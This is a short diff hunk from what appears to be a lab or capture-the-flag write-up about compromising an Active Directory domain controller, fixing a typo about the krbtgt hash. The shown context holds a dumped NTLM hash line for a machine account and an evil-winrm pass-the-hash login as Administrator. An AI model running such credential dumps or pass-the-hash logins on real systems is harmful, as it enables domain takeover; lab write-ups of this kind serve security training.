@@ -387,7 +387,7 @@ DC01$:1000:aad3b435b51404eeaad3b435b51404ee:1f89b703c629e66a7c9d5c78e22742f8:::
 
 ...[SNIP]...
 ```
-Now since the lab wants the krtgt account ntlm hash i can grab it and complete the machine!
+Now since the lab wants the krbtgt account ntlm hash instead of flags, i can grab it and complete the machine!
 
 ```python
 evil-winrm -i dc01.dry.martini.bars -u Administrator -H 'd5cad8a9782b2879bf316f56936f1e36'
